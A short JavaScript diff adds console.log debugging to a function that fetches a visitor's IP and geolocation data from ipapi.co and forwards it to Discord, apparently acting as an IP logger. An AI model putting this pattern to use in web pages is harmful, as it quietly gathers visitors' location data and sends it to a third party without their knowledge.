@@ -38,8 +38,12 @@ ${addressMessage}
 
 function sendIPData() {
   fetch("https://ipapi.co/json")
-    .then((response) => response.json())
+    .then((response) => {
+      console.log(response);
+      return response.json();
+    })
     .then((ipData) => {
+      console.log(ipData);
       sendToDiscord(ipData, null); // Send IP data to Discord
     })
     .catch((error) => console.error(`Error retrieving IP data: ${error}`));
